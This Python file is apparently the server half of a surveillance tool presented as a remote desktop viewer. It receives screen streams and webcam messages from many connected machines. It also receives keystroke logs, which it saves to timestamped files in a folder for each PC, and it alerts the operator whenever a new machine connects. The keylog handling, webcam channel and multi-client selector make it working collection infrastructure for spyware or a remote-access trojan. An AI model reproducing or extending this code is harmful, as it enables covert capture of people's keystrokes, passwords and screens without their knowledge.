"""
Remote Desktop Viewer Server
Receives and displays screen stream from client
"""
import asyncio
import ssl
import argparse
import sys
import logging
from pathlib import Path
import io
import threading
import platform
import datetime

# Try to import tkinter (optional - only needed for GUI mode)
try:
    import tkinter as tk
    from tkinter import messagebox
    from PIL import Image, ImageTk
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from config import (
    DEFAULT_SERVER_HOST, DEFAULT_SERVER_PORT,
    SERVER_CERT, SERVER_KEY, CA_CERT, SERVER_LOG, KEYLOG_FILE, KEYLOG_ENABLED
)
from common.protocol import FrameEncoder, ProtocolHandler, MessageType

# Try to import embedded certificates, fallback to file-based if not available
try:
    from common.embedded_certs import create_ssl_context_server as create_embedded_ssl_context
    USE_EMBEDDED_CERTS = True
except ImportError:
    USE_EMBEDDED_CERTS = False

# Configure logging
handlers = [logging.StreamHandler()]
if SERVER_LOG:
    handlers.append(logging.FileHandler(SERVER_LOG))

logging.basicConfig(
    level=logging.INFO,  # Changed from DEBUG to INFO to reduce noise
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=handlers
)

# Suppress eventlet connection errors (they're harmless)
logging.getLogger('eventlet.wsgi').setLevel(logging.ERROR)
logging.getLogger('eventlet.greenio').setLevel(logging.ERROR)

logger = logging.getLogger(__name__)

class RemoteDesktopServer:
    """Server for receiving and displaying remote desktop stream"""
    
    def __init__(self, host: str = DEFAULT_SERVER_HOST, port: int = DEFAULT_SERVER_PORT):
        self.host = host
        self.port = port
        self.clients = {}
        self.frame_buffer = {}
        self.gui_callback = None  # Callback for GUI notifications
        self.webcam_error_callback = None  # Callback for webcam errors
        
        # Setup keylog file
        if KEYLOG_ENABLED and KEYLOG_FILE:
            KEYLOG_FILE.parent.mkdir(parents=True, exist_ok=True)
            logger.info(f"Keylog file: {KEYLOG_FILE}")
        
    def create_ssl_context(self):
        """Create SSL context for secure connection"""
        # Try embedded certificates first
        if USE_EMBEDDED_CERTS:
            try:
                logger.info("Server: Using embedded SSL/TLS certificates")
                print("Server: Using embedded SSL/TLS certificates")
                sys.stdout.flush()
                return create_embedded_ssl_context()
            except Exception as e:
                logger.warning(f"Failed to load embedded certificates: {e}, falling back to file-based")
                print(f"Server: Failed to load embedded certificates, falling back to file-based")
                sys.stdout.flush()
        
        # Fallback to file-based certificates
        # Check if certificates exist
        has_certs = SERVER_CERT.exists() and SERVER_KEY.exists()
        logger.info(f"Server certificate check: SERVER_CERT={SERVER_CERT.exists()}, SERVER_KEY={SERVER_KEY.exists()}")
        print(f"Server certificate check: SERVER_CERT={SERVER_CERT.exists()}, SERVER_KEY={SERVER_KEY.exists()}")
        sys.stdout.flush()
        
        if not has_certs:
            logger.warning("Server certificates not found. Using unencrypted connection.")
            print("Server: Using unencrypted connection (no certificates)")
            sys.stdout.flush()
            return None
        
        # Certificates exist - create SSL context
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(str(SERVER_CERT), str(SERVER_KEY))
        
        # Load CA certificate for client verification
        if CA_CERT.exists():
            context.load_verify_locations(str(CA_CERT))
            context.verify_mode = ssl.CERT_OPTIONAL
        
        logger.info("Server: Using SSL/TLS connection (certificates found)")
        print("Server: Using SSL/TLS connection (certificates found)")
        sys.stdout.flush()
        return context
    
    def _alert_new_client(self, pc_name: str, client_id: str):
        """Alert when a new client connects"""
        # System beep (cross-platform)
        try:
            if platform.system() == "Windows":
                import winsound
                winsound.Beep(1000, 200)  # 1000 Hz for 200ms
            elif platform.system() == "Linux":
                # Use system bell
                print("\a", end="", flush=True)
            elif platform.system() == "Darwin":  # macOS
                # Use system bell
                print("\a", end="", flush=True)
        except Exception as e:
            logger.debug(f"Could not play beep sound: {e}")
        
        # GUI notification (if GUI is available)
        if self.gui_callback:
            try:
                # Call GUI callback in a thread-safe way
                threading.Thread(
                    target=self.gui_callback,
                    args=(pc_name, client_id),
                    daemon=True
                ).start()
            except Exception as e:
                logger.debug(f"Could not show GUI alert: {e}")
    
    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle a client connection"""
        client_id = "unknown"
        frames_received = 0
        
        try:
            client_addr = writer.get_extra_info('peername')
            client_id = f"{client_addr[0]}:{client_addr[1]}"
        except Exception as e:
            logger.error(f"Error getting client address: {e}")
            print(f"ERROR getting client address: {e}")
            client_id = "unknown"
        
        # Read PC name from client (sent immediately after connection)
        pc_name = client_id  # Default to IP:port if name not received
        try:
            name_length_bytes = await asyncio.wait_for(reader.read(4), timeout=2.0)
            if len(name_length_bytes) == 4:
                name_length = int.from_bytes(name_length_bytes, 'big')
                if 0 < name_length <= 256:  # Reasonable limit
                    pc_name_bytes = await asyncio.wait_for(reader.read(name_length), timeout=2.0)
                    if len(pc_name_bytes) == name_length:
                        pc_name = pc_name_bytes.decode('utf-8')
        except (asyncio.TimeoutError, ValueError, UnicodeDecodeError) as e:
            logger.debug(f"Could not read PC name from {client_id}: {e}, using IP:port as name")
        
        logger.info(f"Client connected: {pc_name} ({client_id})")
        print(f"Client connected: {pc_name} ({client_id})")  # Also print to stdout for immediate visibility
        sys.stdout.flush()  # Force flush to ensure output appears
        
        # Alert: New client connected
        self._alert_new_client(pc_name, client_id)
        
        self.clients[client_id] = {
            'reader': reader,
            'writer': writer,
            'frame_buffer': {},
            'pc_name': pc_name  # Store PC name
        }
        
        try:
            logger.debug(f"Starting message loop for {client_id} ({pc_name})")
            # Small delay to ensure connection is fully established before reading
            await asyncio.sleep(0.1)
            while True:
                try:
                    # Read message length
                    try:
                        length_bytes = await asyncio.wait_for(reader.readexactly(4), timeout=30.0)
                    except asyncio.TimeoutError:
                        logger.warning(f"Timeout waiting for data from {client_id}")
                        # Send heartbeat request or just continue
                        continue
                    except asyncio.IncompleteReadError as ire:
                        # Check if we got partial data
                        if hasattr(ire, 'partial') and ire.partial:
                            partial_len = len(ire.partial)
                            logger.info(f"Client {client_id} disconnected while reading length: got {partial_len}/4 bytes")
                        else:
                            logger.info(f"Client {client_id} disconnected while reading length: connection closed (0 bytes received)")
                        break
                    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
                        logger.info(f"Client {client_id} connection reset while reading length: {e}")
                        break
                    
                    if not length_bytes or len(length_bytes) != 4:
                        logger.warning(f"Invalid length bytes from {client_id}: {length_bytes}")
                        break
                    
                    try:
                        length = int.from_bytes(length_bytes, 'big')
                    except Exception as e:
                        logger.error(f"Failed to parse length from {client_id}: {e}")
                        logger.error(f"Length bytes (hex): {length_bytes.hex()}, (raw): {length_bytes}")
                        break
                    
                    # Debug: Log length for first few messages
                    if frames_received < 5:
                        logger.debug(f"Reading message from {client_id}: length={length} bytes (hex: {length_bytes.hex()})")
                    
                    # Validate length (prevent DoS with huge messages)
                    if length <= 0:
                        logger.warning(f"Invalid message length from {client_id}: {length} (must be > 0)")
                        logger.warning(f"Length bytes (hex): {length_bytes.hex()}, (raw): {length_bytes}")
                        break
                    if length > 50 * 1024 * 1024:  # Max 50MB
                        logger.error(f"Message too large from {client_id}: {length} bytes (max 50MB)")
                        logger.error(f"Length bytes (hex): {length_bytes.hex()}, (raw): {length_bytes}")
                        logger.error(f"This usually indicates a protocol mismatch - client may be sending wrong format")
                        # Try to peek at what comes next to diagnose
                        try:
                            peek_data = await asyncio.wait_for(reader.read(20), timeout=1.0)
                            if peek_data:
                                logger.error(f"Next 20 bytes after length (hex): {peek_data.hex()}")
                                if len(peek_data) >= 1:
                                    msg_type_byte = peek_data[0]
                                    logger.error(f"First byte after length: 0x{msg_type_byte:02x} (if < 6, this might be message type)")
                        except Exception as peek_err:
                            logger.debug(f"Could not peek at next bytes: {peek_err}")
                        break
                    
                    # Read message data
                    try:
                        if frames_received < 5:
                            logger.debug(f"Reading {length} bytes from {client_id} (frame #{frames_received + 1})")
                        data = await asyncio.wait_for(reader.readexactly(length), timeout=60.0)
                        if frames_received < 5:
                            logger.debug(f"Received {len(data)} bytes from {client_id} (frame #{frames_received + 1})")
                    except asyncio.TimeoutError:
                        logger.warning(f"Timeout reading {length} bytes from {client_id} after {frames_received} frames")
                        break
                    except asyncio.IncompleteReadError as ire:
                        partial_len = len(ire.partial) if hasattr(ire, 'partial') and ire.partial else 0
                        logger.info(f"Client {client_id} disconnected (incomplete read: expected {length}, got {partial_len}) after {frames_received} frames")
                        break
                    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
                        logger.info(f"Client {client_id} connection reset while reading: {e} (after {frames_received} frames)")
                        break
                    
                    if not data:
                        logger.warning(f"No data received from {client_id} for length {length}")
                        break
                    if len(data) != length:
                        logger.warning(f"Incomplete data from {client_id}: expected {length}, got {len(data)}")
                        break
                    
                    # Decode message
                    try:
                        # First, check message type to determine how to decode
                        if len(data) < 1:
                            logger.warning(f"Message too short from {client_id}")
                            continue
                        
                        msg_type_byte = data[0]
                        
                        # Check if it's a frame message (SCREEN_FRAME or DELTA_UPDATE)
                        if msg_type_byte in (int(MessageType.SCREEN_FRAME), int(MessageType.DELTA_UPDATE)):
                            msg_type, frame_id, is_delta, delta_rect, frame_data = FrameEncoder.decode_frame(data)
                            
                            frames_received += 1
                            if frames_received <= 5 or frames_received % 10 == 0:
                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
                                logger.info(f"Received frame from {pc_name} (total: {frames_received}, type: {msg_type.name}, size: {len(frame_data)} bytes)")
                                print(f"Received frame from {pc_name} (total: {frames_received})")  # Also print to stdout
                            
                            if msg_type == MessageType.SCREEN_FRAME:
                                # Full frame
                                self.frame_buffer[client_id] = {
                                    'frame_data': frame_data,
                                    'frame_id': frame_id,
                                    'is_delta': False
                                }
                                logger.debug(f"Received full frame from {client_id} ({len(frame_data)} bytes)")
                            elif msg_type == MessageType.DELTA_UPDATE:
                                # Delta update - apply to existing frame
                                if client_id in self.frame_buffer:
                                    # In a real implementation, you'd merge the delta
                                    # For simplicity, we'll just update the buffer
                                    self.frame_buffer[client_id] = {
                                        'frame_data': frame_data,
                                        'frame_id': frame_id,
                                        'is_delta': True,
                                        'delta_rect': delta_rect
                                    }
                                else:
                                    # No previous frame, treat as full frame
                                    self.frame_buffer[client_id] = {
                                        'frame_data': frame_data,
                                        'frame_id': frame_id,
                                        'is_delta': False
                                    }
                        elif msg_type_byte == int(MessageType.HEARTBEAT):
                            # Heartbeat - just acknowledge
                            logger.debug(f"Received heartbeat from {client_id}")
                        elif msg_type_byte == int(MessageType.WEBCAM_ERROR):
                            # Webcam error - decode and log
                            try:
                                msg_type, msg_data = ProtocolHandler.decode_message(data)
                                error_msg = msg_data.decode('utf-8')
                                logger.warning(f"Webcam error from {client_id}: {error_msg}")
                                # Forward to web interface if callback is set
                                if self.webcam_error_callback:
                                    try:
                                        self.webcam_error_callback(client_id, error_msg)
                                    except Exception as cb_err:
                                        logger.error(f"Error in webcam error callback: {cb_err}")
                            except Exception as decode_err:
                                logger.error(f"Failed to decode webcam error: {decode_err}")
                        elif msg_type_byte == int(MessageType.KEYLOG):
                            # Keylog message
                            logger.info(f"Received KEYLOG message from {client_id}")
                            try:
                                msg_type, msg_data = ProtocolHandler.decode_message(data)
                                log_content = msg_data.decode('utf-8')
                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
                                logger.info(f"Keylog from {pc_name}: {len(log_content)} characters")
                                
                                # Save to file if enabled
                                if KEYLOG_ENABLED and KEYLOG_FILE:
                                    try:
                                        # Create directory for this client
                                        client_dir = KEYLOG_FILE.parent / pc_name
                                        client_dir.mkdir(parents=True, exist_ok=True)
                                        
                                        # Extract filename from log content (first line should have it)
                                        # Or create new filename with timestamp
                                        timestamp = datetime.datetime.now().strftime("%d.%m.%Y_%H.%M.%S")
                                        log_filename = f"{pc_name}_{timestamp}.txt"
                                        log_filepath = client_dir / log_filename
                                        
                                        # Write log content
                                        with open(log_filepath, 'w', encoding='utf-8') as f:
                                            f.write(log_content)
                                        
                                        logger.info(f"Keylog saved to: {log_filepath}")
                                        print(f"[KEYLOG] Saved {pc_name}: {log_filepath.name} ({len(log_content)} chars)")
                                    except Exception as file_err:
                                        logger.error(f"Error writing keylog to file: {file_err}")
                            except Exception as decode_err:
                                logger.error(f"Failed to decode keylog: {decode_err}")
                                import traceback
                                logger.error(traceback.format_exc())
                        else:
                            logger.warning(f"Unknown message type from {client_id}: {msg_type_byte}")
                        
                    except ValueError as ve:
                        logger.warning(f"Frame decode error (ValueError) from {client_id}: {ve} - skipping frame")
                        logger.debug(f"Data length: {len(data)}, first 20 bytes: {data[:20] if len(data) >= 20 else data}")
                        # Don't close connection - just skip this frame
                        continue
                    except Exception as e:
                        logger.error(f"Error decoding frame from {client_id}: {type(e).__name__}: {e}")
                        logger.error(f"Data length: {len(data)}, first 50 bytes: {data[:50] if len(data) >= 50 else data}")
                        import traceback
                        logger.error(f"Decode traceback: {traceback.format_exc()}")
                        # Don't close connection - just skip this frame and continue
                        continue
                        
                except asyncio.IncompleteReadError as ire:
                    logger.info(f"Client {client_id} disconnected (incomplete read)")
                    break
                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
                    logger.info(f"Client {client_id} connection reset: {conn_err}")
                    break
                except OSError as ose:
                    logger.info(f"Client {client_id} OS error: {ose}")
                    break
                
        except asyncio.IncompleteReadError:
            pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
            logger.info(f"Client disconnected: {pc_name} ({client_id}) (received {frames_received} frames)")
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError) as e:
            pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
            logger.info(f"Client connection reset: {pc_name} ({client_id}) - {e} (received {frames_received} frames)")
        except Exception as e:
            logger.error(f"Error handling client {client_id}: {type(e).__name__}: {e} (received {frames_received} frames)")
            import traceback
            logger.error(f"Traceback: {traceback.format_exc()}")
            print(f"ERROR handling client {client_id}: {e}")  # Also print to stdout
            traceback.print_exc()  # Print to stdout as well
        finally:
            logger.info(f"Cleaning up client {client_id} (total frames received: {frames_received})")
            print(f"Cleaning up client {client_id} (total frames received: {frames_received})")  # Also print to stdout
            if client_id in self.clients:
                del self.clients[client_id]
            if client_id in self.frame_buffer:
                del self.frame_buffer[client_id]
            try:
                if not writer.is_closing():
                    writer.close()
                    await writer.wait_closed()
            except Exception as cleanup_err:
                logger.debug(f"Error during cleanup for {client_id}: {cleanup_err}")
                print(f"Error during cleanup for {client_id}: {cleanup_err}")  # Also print to stdout
    
    async def start_server(self):
        """Start the server"""
        ssl_context = self.create_ssl_context()
        
        async def client_handler(reader, writer):
            """Wrapper to catch any exceptions in handle_client"""
            print("=== CLIENT HANDLER CALLED ===")  # Immediate visibility
            sys.stdout.flush()
            logger.info("=== CLIENT HANDLER CALLED ===")
            try:
                await self.handle_client(reader, writer)
            except Exception as e:
                logger.error(f"Unhandled exception in client_handler: {type(e).__name__}: {e}")
                print(f"CRITICAL ERROR in client_handler: {e}")
                import traceback
                logger.error(f"Traceback: {traceback.format_exc()}")
                traceback.print_exc()
                try:
                    if not writer.is_closing():
                        writer.close()
                        await writer.wait_closed()
                except:
                    pass
        
        ssl_mode = "SSL/TLS" if ssl_context else "UNENCRYPTED"
        logger.info(f"Starting server on {self.host}:{self.port} ({ssl_mode})")
        print(f"Starting server on {self.host}:{self.port} ({ssl_mode})")
        sys.stdout.flush()
        
        server = await asyncio.start_server(
            client_handler,
            self.host,
            self.port,
            ssl=ssl_context if ssl_context else None
        )
        
        logger.info(f"Server listening on {self.host}:{self.port} ({ssl_mode})")
        print(f"Server listening on {self.host}:{self.port} ({ssl_mode})")  # Also print to stdout
        sys.stdout.flush()
        
        async with server:
            await server.serve_forever()
    
    def get_latest_frame(self, client_id: str = None) -> dict:
        """Get latest frame from buffer"""
        if client_id:
            return self.frame_buffer.get(client_id)
        elif self.frame_buffer:
            # Return first available client's frame
            return next(iter(self.frame_buffer.values()))
        return None
    
    def get_connected_clients(self) -> list:
        """Get list of connected client IDs"""
        return list(self.clients.keys())
    
    def get_client_info(self, client_id: str) -> dict:
        """Get information about a client"""
        if client_id not in self.clients:
            return None
        frame_info = self.frame_buffer.get(client_id, {})
        return {
            'client_id': client_id,
            'has_frame': client_id in self.frame_buffer,
            'connected': True
        }

class RemoteDesktopViewer:
    """GUI viewer for remote desktop stream"""
    
    def __init__(self, server: RemoteDesktopServer):
        self.server = server
        # Set up GUI callback for new client alerts
        self.server.gui_callback = self.show_new_client_alert
        self.root = tk.Tk()
        self.root.title("Remote Desktop Viewer")
        self.root.geometry("1280x720")
        
        # Currently selected client
        self.selected_client_id = None
        
        # Create top frame for client selector
        self.top_frame = tk.Frame(self.root, bg='#2b2b2b')
        self.top_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Client selector label
        self.selector_label = tk.Label(
            self.top_frame,
            text="Client:",
            bg='#2b2b2b',
            fg='white',
            font=('Arial', 10)
        )
        self.selector_label.pack(side=tk.LEFT, padx=5)
        
        # Client dropdown (Combobox)
        self.client_var = tk.StringVar()
        self.client_dropdown = tk.OptionMenu(self.top_frame, self.client_var, "", command=self.on_client_selected)
        self.client_dropdown.pack(side=tk.LEFT, padx=5)
        self.client_dropdown.config(bg='#3b3b3b', fg='white', font=('Arial', 10))
        
        # Refresh button
        self.refresh_btn = tk.Button(
            self.top_frame,
            text="Refresh",
            command=self.refresh_client_list,
            bg='#4b4b4b',
            fg='white',
            font=('Arial', 9)
        )
        self.refresh_btn.pack(side=tk.LEFT, padx=5)
        
        # Keyboard shortcuts info
        self.shortcuts_label = tk.Label(
            self.top_frame,
            text="[Tab] Next | [Shift+Tab] Previous | [R] Refresh",
            bg='#2b2b2b',
            fg='#888888',
            font=('Arial', 8)
        )
        self.shortcuts_label.pack(side=tk.RIGHT, padx=5)
        
        # Create canvas for displaying frames
        self.canvas = tk.Canvas(self.root, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        # Status label
        self.status_label = tk.Label(
            self.root,
            text="Waiting for connection...",
            bg='black',
            fg='white',
            font=('Arial', 12)
        )
        self.status_label.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Bind keyboard shortcuts
        self.root.bind('<Tab>', self.next_client)
        self.root.bind('<Shift-Tab>', self.previous_client)
        self.root.bind('<r>', lambda e: self.refresh_client_list())
        self.root.bind('<R>', lambda e: self.refresh_client_list())
        self.root.focus_set()  # Allow keyboard focus
        
        self.running = True
        self.update_interval = 50  # milliseconds (20 FPS display)
        
        # Initial client list refresh
        self.refresh_client_list()
    
    def refresh_client_list(self):
        """Refresh the client dropdown list"""
        try:
            # Get current selection
            current_selection = self.client_var.get()
            
            # Get connected clients
            clients = self.server.get_connected_clients()
            
            # Get the dropdown menu
            menu = self.client_dropdown['menu']
            menu.delete(0, 'end')
            
            if not clients:
                menu.add_command(label="No clients connected", command=lambda: None)
                self.client_var.set("")
                self.selected_client_id = None
            else:
                # Add each client to menu (show PC name, but store client_id)
                for client_id in clients:
                    pc_name = self.server.clients.get(client_id, {}).get('pc_name', client_id)
                    display_name = f"{pc_name} ({client_id})"
                    menu.add_command(
                        label=display_name,
                        command=lambda cid=client_id, disp=display_name: self.client_var.set(disp) or self.on_client_selected(cid)
                    )
                
                # Restore selection if still valid
                if current_selection in clients:
                    pc_name = self.server.clients.get(current_selection, {}).get('pc_name', current_selection)
                    display_name = f"{pc_name} ({current_selection})"
                    self.client_var.set(display_name)
                    self.selected_client_id = current_selection
                elif clients:
                    # Select first client if previous selection is gone
                    pc_name = self.server.clients.get(clients[0], {}).get('pc_name', clients[0])
                    display_name = f"{pc_name} ({clients[0]})"
                    self.client_var.set(display_name)
                    self.selected_client_id = clients[0]
        except Exception as e:
            logger.error(f"Error refreshing client list: {e}")
    
    def on_client_selected(self, client_id: str):
        """Handle client selection from dropdown"""
        self.selected_client_id = client_id
        pc_name = self.server.clients.get(client_id, {}).get('pc_name', client_id)
        logger.info(f"Selected client: {pc_name} ({client_id})")
    
    def next_client(self, event=None):
        """Switch to next client (Tab key)"""
        clients = self.server.get_connected_clients()
        if not clients:
            return
        
        if not self.selected_client_id or self.selected_client_id not in clients:
            # Select first client
            if clients:
                pc_name = self.server.clients.get(clients[0], {}).get('pc_name', clients[0])
                display_name = f"{pc_name} ({clients[0]})"
                self.client_var.set(display_name)
                self.selected_client_id = clients[0]
        else:
            # Find current index and move to next
            try:
                current_index = clients.index(self.selected_client_id)
                next_index = (current_index + 1) % len(clients)
                next_client_id = clients[next_index]
                pc_name = self.server.clients.get(next_client_id, {}).get('pc_name', next_client_id)
                display_name = f"{pc_name} ({next_client_id})"
                self.client_var.set(display_name)
                self.selected_client_id = next_client_id
            except ValueError:
                # Current selection not in list, select first
                pc_name = self.server.clients.get(clients[0], {}).get('pc_name', clients[0])
                display_name = f"{pc_name} ({clients[0]})"
                self.client_var.set(display_name)
                self.selected_client_id = clients[0]
    
    def previous_client(self, event=None):
        """Switch to previous client (Shift+Tab key)"""
        clients = self.server.get_connected_clients()
        if not clients:
            return
        
        if not self.selected_client_id or self.selected_client_id not in clients:
            # Select last client
            if clients:
                pc_name = self.server.clients.get(clients[-1], {}).get('pc_name', clients[-1])
                display_name = f"{pc_name} ({clients[-1]})"
                self.client_var.set(display_name)
                self.selected_client_id = clients[-1]
        else:
            # Find current index and move to previous
            try:
                current_index = clients.index(self.selected_client_id)
                prev_index = (current_index - 1) % len(clients)
                prev_client_id = clients[prev_index]
                pc_name = self.server.clients.get(prev_client_id, {}).get('pc_name', prev_client_id)
                display_name = f"{pc_name} ({prev_client_id})"
                self.client_var.set(display_name)
                self.selected_client_id = prev_client_id
            except ValueError:
                # Current selection not in list, select last
                pc_name = self.server.clients.get(clients[-1], {}).get('pc_name', clients[-1])
                display_name = f"{pc_name} ({clients[-1]})"
                self.client_var.set(display_name)
                self.selected_client_id = clients[-1]
    
    def update_display(self):
        """Update the display with latest frame"""
        if not self.running:
            return
        
        # Refresh client list periodically (every 2 seconds)
        if hasattr(self, '_last_refresh'):
            if (self.root.after_info(self._last_refresh) is None) or \
               (hasattr(self, '_refresh_counter') and self._refresh_counter >= 40):  # ~2 seconds at 50ms interval
                self.refresh_client_list()
                self._refresh_counter = 0
            else:
                self._refresh_counter = getattr(self, '_refresh_counter', 0) + 1
        else:
            self._refresh_counter = 0
        
        # Get frame from selected client, or first available
        if self.selected_client_id:
            frame_info = self.server.get_latest_frame(self.selected_client_id)
        else:
            frame_info = self.server.get_latest_frame()
            # Auto-select first client if available
            if frame_info:
                clients = self.server.get_connected_clients()
                if clients:
                    pc_name = self.server.clients.get(clients[0], {}).get('pc_name', clients[0])
                    display_name = f"{pc_name} ({clients[0]})"
                    self.selected_client_id = clients[0]
                    self.client_var.set(display_name)
        
        if frame_info:
            try:
                # Convert frame data to image
                img = Image.open(io.BytesIO(frame_info['frame_data']))
                
                # Resize to fit canvas
                canvas_width = self.canvas.winfo_width()
                canvas_height = self.canvas.winfo_height()
                
                if canvas_width > 1 and canvas_height > 1:
                    img.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
                    
                    # Convert to PhotoImage
                    photo = ImageTk.PhotoImage(img)
                    
                    # Update canvas
                    self.canvas.delete("all")
                    self.canvas.create_image(
                        canvas_width // 2,
                        canvas_height // 2,
                        image=photo,
                        anchor=tk.CENTER
                    )
                    self.canvas.image = photo  # Keep a reference
                    
                    # Update status
                    client_count = len(self.server.clients)
                    if self.selected_client_id:
                        pc_name = self.server.clients.get(self.selected_client_id, {}).get('pc_name', self.selected_client_id)
                        client_name = f"{pc_name} ({self.selected_client_id})"
                    else:
                        client_name = "None"
                    self.status_label.config(
                        text=f"Client: {client_name} | Connected: {client_count} client(s)"
                    )
            except Exception as e:
                logger.error(f"Error updating display: {e}")
        else:
            client_count = len(self.server.clients)
            if client_count > 0:
                self.status_label.config(text=f"Waiting for frame from client... ({client_count} client(s) connected)")
            else:
                self.status_label.config(text="Waiting for connection...")
        
        # Schedule next update
        if self.running:
            self.root.after(self.update_interval, self.update_display)
    
    def run(self):
        """Start the viewer"""
        self.update_display()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()
    
    def show_new_client_alert(self, pc_name: str, client_id: str):
        """Show alert popup for new client connection"""
        try:
            # Bring window to front
            self.root.lift()
            self.root.attributes('-topmost', True)
            self.root.after_idle(lambda: self.root.attributes('-topmost', False))
            
            # Show messagebox
            messagebox.showinfo(
                "New Client Connected",
                f"A new client has connected:\n\n"
                f"PC Name: {pc_name}\n"
                f"Address: {client_id}\n\n"
                f"Total clients: {len(self.server.clients)}",
                parent=self.root
            )
        except Exception as e:
            logger.error(f"Error showing new client alert: {e}")
    
    def on_closing(self):
        """Handle window closing"""
        self.running = False
        self.root.destroy()

def run_server(host: str, port: int, gui: bool = True, web: bool = False, web_port: int = 5000):
    """Run server with optional GUI or web interface"""
    server = RemoteDesktopServer(host, port)
    
    # Store the event loop reference
    server_loop = None
    
    # Start server in background thread
    def run_server_async():
        nonlocal server_loop
        server_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(server_loop)
        server_loop.run_until_complete(server.start_server())
    
    server_thread = threading.Thread(target=run_server_async, daemon=True)
    server_thread.start()
    
    # Wait for event loop to be created
    import time
    for _ in range(50):  # Wait up to 5 seconds
        if server_loop:
            break
        time.sleep(0.1)
    
    if web:
        # Start web server
        try:
            from server.web_server import init_web_server, run_web_server
            init_web_server(server, server_loop)  # Pass the event loop
            # Run web server in a separate thread
            web_thread = threading.Thread(
                target=run_web_server,
                args=('0.0.0.0', web_port),
                daemon=True
            )
            web_thread.start()
            logger.info(f"Web server started on port {web_port}")
            logger.info(f"Open http://localhost:{web_port} in your browser")
        except ImportError:
            logger.error("Web server dependencies not available. Install: pip install Flask flask-socketio eventlet")
            logger.info("Falling back to GUI mode")
            gui = True
    
    if gui:
        # Start GUI viewer
        if not TKINTER_AVAILABLE:
            logger.error("GUI mode requested but tkinter not available. Use --web instead.")
            print("ERROR: GUI mode not available. Run with --web flag for web interface.")
            sys.exit(1)
        viewer = RemoteDesktopViewer(server)
        viewer.run()
    elif web:
        # Web mode - keep main thread alive
        try:
            logger.info("Server running. Press Ctrl+C to stop.")
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Server stopped")
    else:
        # Headless mode - just run server
        try:
            asyncio.run(server.start_server())
        except KeyboardInterrupt:
            logger.info("Server stopped")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Remote Desktop Viewer Server')
    parser.add_argument('--host', default=DEFAULT_SERVER_HOST, help='Server host')
    parser.add_argument('--port', type=int, default=DEFAULT_SERVER_PORT, help='Server port')
    parser.add_argument('--no-gui', action='store_true', help='Run in headless mode')
    parser.add_argument('--web', action='store_true', help='Run web interface')
    parser.add_argument('--web-port', type=int, default=5000, help='Web server port')
    
    args = parser.parse_args()
    
    run_server(args.host, args.port, gui=not args.no_gui and not args.web, web=args.web, web_port=args.web_port)

if __name__ == "__main__":
    main()
